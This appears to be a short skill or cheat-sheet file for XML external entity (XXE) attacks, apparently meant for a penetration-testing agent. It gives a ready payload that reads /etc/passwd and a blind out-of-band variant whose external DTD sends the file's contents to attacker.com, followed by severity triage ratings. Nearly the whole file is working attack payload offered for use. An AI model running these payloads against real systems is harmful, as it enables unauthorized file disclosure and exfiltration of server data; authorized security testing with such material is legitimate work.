# SKILL: xxe
## Payloads
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
## Blind
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/x.dtd">%xxe;]>
x.dtd:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;%exfil;
## Triage
File read → High. SSRF → High. OOB → Med.
